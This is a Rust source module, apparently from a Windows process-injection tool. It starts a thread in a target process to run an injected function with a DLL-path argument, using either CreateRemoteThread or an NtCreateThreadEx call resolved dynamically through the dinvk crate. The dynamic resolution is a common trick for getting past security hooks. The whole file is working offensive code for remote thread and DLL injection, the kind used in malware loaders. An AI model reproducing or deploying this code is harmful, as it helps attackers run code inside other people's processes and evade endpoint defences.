use std::{ffi::c_void, ptr};

use dinvk::{data::NtCreateThreadEx, dinvoke};

use windows::core::w;
use windows::Win32::{
    Foundation::HANDLE,
    System::{
        LibraryLoader::GetModuleHandleW,
        Threading::{CreateRemoteThread, THREAD_ALL_ACCESS}
    }
};


#[derive(Debug)]
pub enum ShellcodeExecution {
    CreateRemoteThread,
    NtCreateThreadEx
}

pub fn execute(shellcode_execution_method: ShellcodeExecution, process_handle: HANDLE, inject_func: unsafe extern "system" fn() -> isize, dll_path_mem_alloc: *mut c_void) -> Result<HANDLE, Box<dyn std::error::Error>> {
    match shellcode_execution_method {
        ShellcodeExecution::CreateRemoteThread => execute_create_remote_thread(process_handle, inject_func, dll_path_mem_alloc),
        ShellcodeExecution::NtCreateThreadEx => execute_nt_create_thread_ex(process_handle, inject_func, dll_path_mem_alloc),
    }
}

fn execute_create_remote_thread(
    process_handle: HANDLE,
    inject_func: unsafe extern "system" fn() -> isize,
    dll_path_mem_alloc: *mut c_void
) -> Result<HANDLE, Box<dyn std::error::Error>> {
    let thread = unsafe {
        CreateRemoteThread(
            process_handle, 
            None,
            0,
            Some(std::mem::transmute(inject_func)),
            Some(dll_path_mem_alloc),
            0,
            None
        )
    }?;

    Ok(thread)
}

fn execute_nt_create_thread_ex(
    process_handle: HANDLE,
    inject_func: unsafe extern "system" fn() -> isize,
    dll_path_mem_alloc: *mut c_void
) -> Result<HANDLE, Box<dyn std::error::Error>> {

    let ntdll = unsafe { GetModuleHandleW(w!("ntdll.dll"))? };
    let mut thread: HANDLE = HANDLE::default();
    let pthread: *mut *mut c_void = &mut thread.0;

    let ntstatus: i32 = dinvoke!(
        ntdll.0,
        "NtCreateThreadEx",
        NtCreateThreadEx,
        pthread,
        THREAD_ALL_ACCESS.0,
        ptr::null_mut(),
        process_handle.0,
        std::mem::transmute(inject_func),
        dll_path_mem_alloc,
        0,
        0,
        0,
        0,
        ptr::null_mut()
    )
    .ok_or_else(|| "NtCreateThreadEx not found or resolved incorrectly")?;

    if ntstatus != 0 {
        return Err(format!("NtCreateThreadEx failed with NTSTATUS: {:#x}", ntstatus).into());
    }

    Ok(thread)
}